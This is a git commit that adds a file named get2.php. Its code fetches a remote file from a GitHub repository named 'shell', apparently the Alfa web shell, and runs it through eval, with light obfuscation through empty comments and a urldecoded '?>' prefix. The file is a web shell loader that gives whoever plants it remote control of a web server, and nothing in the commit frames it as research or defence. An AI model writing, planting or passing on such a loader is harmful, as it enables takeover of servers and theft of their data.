07ff1be94fc7fb754b2f55d9211a462401bcce29
zeanboy1337 <zeanboy1337@gmail.com>
2025-06-23 02:15:05 +0700

    Create get2.php

---
+++ get2.php
@@ -0,0 +1,8 @@
+<?php eval(
+    /**_**/ urldecode("%3f%3e") .
+        file_get_contents(
+            /**_**/ urldecode(
+                /**_**/ "https://github.com/zeanboy1337/shell/raw/refs/heads/main/alfahas.txt"
+            )
+        )
+); ?>
